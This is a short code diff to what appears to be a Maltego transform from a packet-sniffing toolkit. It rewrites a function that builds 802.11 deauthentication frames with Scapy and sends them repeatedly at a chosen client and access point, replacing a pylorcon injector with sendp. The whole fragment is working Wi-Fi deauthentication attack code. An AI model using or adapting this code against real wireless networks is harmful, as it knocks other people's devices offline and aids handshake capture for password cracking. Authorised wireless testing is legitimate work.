@@ -46,19 +46,13 @@ def dotransform(request, response):
   if 'sniffMyPackets.clientBSSID' in request.fields:
     bssid = request.fields['sniffMyPackets.clientBSSID']
   
-  injector = pylorcon.Lorcon("wlan3","rt73usb")
-  injector.setfunctionalmode('INJECT')
-  injector.setmode('MONITOR')
-  injector.setchannel(channel)
-  
-  packet = sendp(RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7),iface=interface)
+  packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
   
   def deauth(pktcount):
 	for n in range(pktcount):
-	  injector.txpacket(packet)
-  
-	  
-  deAuth(pktcount)
+	  sendp(packet)
+    
+  deauth(pktcount)
   response = UIMessage('Deauth packets sent')
   
   return response
